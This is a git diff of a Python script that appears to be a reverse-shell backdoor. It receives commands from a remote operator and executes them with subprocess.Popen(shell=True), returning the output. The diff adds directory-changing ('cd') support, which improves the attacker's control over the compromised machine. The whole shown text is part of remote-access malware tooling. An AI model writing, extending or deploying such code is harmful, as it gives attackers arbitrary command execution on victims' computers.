@@ -1,3 +1,4 @@
+import os
 import socket
 import time
 import json
@@ -32,6 +33,8 @@ def shell(target):
         command = reliable_receive(target)
         if command == "exit":
             quit()
+        if command[:3] == "cd ":
+            os.chdir(command[3:])
         else:
             execution = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
             result = execution.stdout.read() + execution.stderr.read()
